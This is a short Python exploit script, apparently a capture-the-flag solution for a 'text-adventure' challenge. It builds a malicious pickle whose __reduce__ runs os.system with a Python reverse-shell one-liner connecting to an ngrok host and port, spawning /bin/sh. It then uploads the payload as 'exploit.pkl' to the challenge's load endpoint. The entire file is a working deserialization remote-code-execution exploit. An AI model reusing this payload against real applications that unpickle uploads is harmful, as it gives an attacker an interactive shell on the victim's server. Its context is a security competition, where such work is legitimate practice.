from utils.ctf.rev_shell import *
import requests
import io

class PickleRCE:
	def __init__(self, cmd):
		self.cmd = cmd
	
	def __reduce__(self):
		return os.system, (self.cmd, )

def pickle_rev_shell(host, port, typ="python"):
	return pickle.dumps(PickleRCE("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(host, port)))

shell = pickle_rev_shell("2.tcp.ngrok.io", 11420)

resp = requests.post(
	"https://text-adventure-api.chall.pwnoh.io/api/load",
	files={"file": ("exploit.pkl", io.BytesIO(shell), "application/octet-stream")}
)
print(resp.text)
